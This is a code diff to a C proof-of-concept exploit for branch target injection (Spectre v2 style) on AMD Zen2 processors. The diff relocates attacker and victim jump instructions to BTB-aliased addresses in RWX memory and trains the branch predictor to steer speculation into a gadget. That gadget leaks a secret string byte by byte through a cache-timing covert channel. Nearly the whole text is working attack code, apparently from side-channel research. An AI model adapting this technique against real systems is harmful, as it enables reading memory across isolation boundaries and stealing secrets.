@@ -12,7 +12,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <x86intrin.h>
-
+#include "utils.h"
 #include <sys/mman.h>
 #include <unistd.h>
 
@@ -20,8 +20,6 @@ enum training_mode {
   TRAIN,
   ATTACK,
 };
-
-#define RET 0xC3
 
 /* The rdtscp in itself takes about 60 cycles on Zen2 */
 #define CACHE_HIT_THRESHOLD 80
@@ -33,60 +31,59 @@ uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];
 
 char *secret = "L Lag gaye";
 
-void indirect_call(void **pointer_to_target, void *leak_addr,
-                   void *covert_channel) {
-
-  __asm__ volatile(
-      /* Move the value of 'secret' into register RDI (first argument). */
-      "mov %[leak_addr], %%rdi\n"
-      /* Move the value of 'covert_channel' into register RSI (second argument).
-       */
-      "mov %[covert_channel], %%rsi\n"
-      /* Invalidate the cache line containing the address pointed to by
-       * `pointer_to_target`.
-       */
-      "clflush (%[pointer_to_target])\n"
-      /* Load the value at the address pointed to by `pointer_to_target` into
-       * register RAX.
-       */
-      "mov (%[pointer_to_target]), %%rax\n"
-      /* Indirectly call the function whose address is stored in RAX. */
-      "call *(%%rax)\n"
-      : /* No output operands */
-      : [pointer_to_target] "r"(pointer_to_target), [leak_addr] "r"(leak_addr),
-        [covert_channel] "r"(covert_channel)
-      : "rax", "rdi", "rsi");
-}
-
-void malicious_target(void *leak_addr, void *covert_channel) {
-  /* A dependant load where the index into the covert channel is dependant on
-   * the secret. This code is only executed speculatively, the infinite loop
-   * ensures the speculation lasts the whole window and repeatedly updates the
-   * covert channel.
-   */
-  __asm__ volatile(
+void malicious_target();
+ __asm__ (
       /* Label for the infinite loop (executed only speculatively) */
-      "1:\n"
+      "malicious_target:\n"
       /* Move a byte from the address pointed to by 'secret_ptr' into EAX
        * zero-extending it.
        */
-      "movzxb (%[leak_addr]), %%eax\n"
+      "movzb (%rdi), %eax\n"
       /* Shift the value in RAX left by 9 bits (multiply by 512). */
-      "shl $9, %%rax\n"
+      "shl $9, %rax\n"
       /* Add the value of 'covert_channel_ptr' to RAX. */
-      "add %[covert_channel], %%rax\n"
+      "add %rsi, %rax\n"
       /* Move the value at the address pointed to by RAX into RBX. */
-      "movq (%%rax), %%rbx\n"
-      /* Jump back to label '1' (creating an infinite loop). */
-      "jmp 1b\n"
-      : /* No output operands */
-      : [leak_addr] "r"(leak_addr), [covert_channel] "r"(covert_channel)
-      : "rax", "rbx");
-}
+      "movq (%rax), %rbx\n"
+      /* When specualting, stop here. */
+      "lfence\n"
+      "jmp continue_bti\n"
+ );
 
+void benign_target();
+asm (
+  "benign_target:\n"
+  /* Stop here on speculation to prevent any other side effects. */
+  "lfence\n"
+  "jmp continue_bti\n"
+);
 
+/* These two addresses are carefully chosen to alias in the BTB. */
+#define VICTIM_BRANCH_ADDRESS 0x41bababababf
+#define ATTACKER_BRANCH_ADDRESS 0x41aaba3a9ae2
 
-void benign_target(void *a, void *b) {}
+/* The instructions are relocated at runtime to
+ * addresses that collide in the BTB. The other
+ * alternative would be to place them in an assembly file
+ * and use a linker script.
+ */
+void victim_insns();
+void victim_insns__end();
+asm (
+  ".align 0x80000\n"
+  "victim_insns:\n"
+  "jmp *(%r11)\n"
+  "victim_insns__end:\n"
+);
+
+void attacker_insns();
+void attacker_insns__end();
+asm (
+  ".align 0x80000\n"
+  "attacker_insns:\n"
+  "jmp *(%r11)\n"
+  "attacker_insns__end:\n"
+);
 
 void flush_covert_channel() {
   for (int i = 0; i < NUM_ELEMENTS; i++)
@@ -99,9 +96,9 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   int hits[NUM_ELEMENTS];
   int winner, runner_up;
 
-  enum training_mode training_sequence[6] = {TRAIN, TRAIN, TRAIN,
-                                             TRAIN, TRAIN, ATTACK};
-  uint8_t saved_first_byte_malicious_target = *(uint8_t *)(malicious_target);
+  enum training_mode training_sequence[6] = {TRAIN};
+  training_sequence[5] = ATTACK;
+
   void (*target)(void *, void *) = NULL;
   void *pointer_to_target = (void *)(&target);
 
@@ -117,22 +114,32 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
     flush_covert_channel();
 
     for (int i = 0; i < 6; i++) {
-      if (training_sequence[i] == ATTACK) {
-        /* Here, the benign target is executed speculatively, but the BPU is
-         * trained to speculate to malicious_target So, the RET instructionis
-         * changed back to the original byte so that the secret dependent load
-         * can be executed speculatively.
+
+      target = (training_sequence[i] == TRAIN) ? malicious_target : benign_target;
+      __asm__ volatile(
+        /* Move the value of 'secret' into register RDI (first argument). */
+        "mov %[leak_addr], %%rdi\n"
+        /* Move the value of 'covert_channel' into register RSI (second argument).
          */
-        *(uint8_t *)(malicious_target) = saved_first_byte_malicious_target;
-        target = benign_target;
-      } else {
-        /* During the training phase, `malicious_target` is executed
-         * architecturally, so the first byte is replaced with a `RET`.
+        "mov %[covert_channel], %%rsi\n"
+        /* Invalidate the cache line containing the address pointed to by
+         * `pointer_to_target`.
          */
-        *(uint8_t *)(malicious_target) = RET;
-        target = malicious_target;
-      }
-      indirect_call(&pointer_to_target, secret_addr, covert_channel);
+        "clflush (%[pointer_to_target])\n"
+        /* Load the value at the address pointed to by `pointer_to_target` into
+         * register RAX.
+         */
+        "mov (%[pointer_to_target]), %%r11\n"
+        "push %[icall]\n"
+        "ret\n"
+        : /* No output operands */
+        : [pointer_to_target] "r"(&pointer_to_target),
+          [leak_addr] "r"(secret_addr),
+          [covert_channel] "r"(covert_channel),
+          [icall] "r" (training_sequence[i] == TRAIN ? ATTACKER_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
+        : "rax", "rdi", "rsi", "r11", "rax");
+        asm("continue_bti:\n");
+        continue;
     }
 
     for (int i = 0; i < NUM_ELEMENTS; i++) {
@@ -177,46 +184,34 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   result++;
 }
 
-void set_cpu_affinity(int cpu) {
-  cpu_set_t set;
-  CPU_ZERO(&set);
-  CPU_SET(cpu, &set);
-  sched_setaffinity(0, sizeof(set), &set);
-}
-
-int make_target_writeable(void *malicious_target) {
-  long page_size = sysconf(_SC_PAGESIZE);
-  if (page_size == -1) {
-    perror("sysconf(_SC_PAGESIZE)");
-    return -1;
-  }
-
-  /* TODO: Using 64 as a best guess as 64 is the size of the cache line,
-   * mprotect may just mark the whole page as writeable.
-   */
-  void *aligned_target = (void *)((long)malicious_target & (~(page_size - 1)));
-
-  if (mprotect(aligned_target, 64, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
-    perror("mprotect");
-    return -1;
-  }
-
-  return 0;
-}
 
 int main() {
   /* Pin to CPU 0 */
-  set_cpu_affinity(0);
+  set_cpu_affinity(12);
+
+  size_t victim_insns__size = victim_insns__end - victim_insns;
+  size_t attacker_insns__size = attacker_insns__end - attacker_insns;
+
+  if (!check_zen2_btb_collision(VICTIM_BRANCH_ADDRESS, ATTACKER_BRANCH_ADDRESS)) {
+    printf("hard coded addresses for victim = %lx, attacker = %lx do not alias in the BTB\n",
+      VICTIM_BRANCH_ADDRESS, ATTACKER_BRANCH_ADDRESS);
+      return -1;
+  }
+  // TODO: Cleanup this, make these into functions.
+  map_or_die((void*)(VICTIM_BRANCH_ADDRESS & ~0xfff), PG_ROUND((VICTIM_BRANCH_ADDRESS & 0xfff) +
+  victim_insns__size), PROT_RWX, MMAP_FLAGS, -1, 0);
+
+  map_or_die((void*)(ATTACKER_BRANCH_ADDRESS & ~0xfff), PG_ROUND((ATTACKER_BRANCH_ADDRESS & 0xfff) +
+  attacker_insns__size), PROT_RWX, MMAP_FLAGS, -1, 0);
+
+  memcpy((void *)VICTIM_BRANCH_ADDRESS, victim_insns, victim_insns__size);
+  memcpy((void *)ATTACKER_BRANCH_ADDRESS, attacker_insns, attacker_insns__size);
 
   char result[2];
   int score[2];
   int probe_len = strlen(secret);
   char *probe_addr = secret;
 
-  if (make_target_writeable(malicious_target) != 0) {
-    printf(
-        "Unable to change permissions (mprotect(RWX)) of the malicious target");
-  }
   printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
   while (--probe_len >= 0) {
     printf("reading %p...", probe_addr);
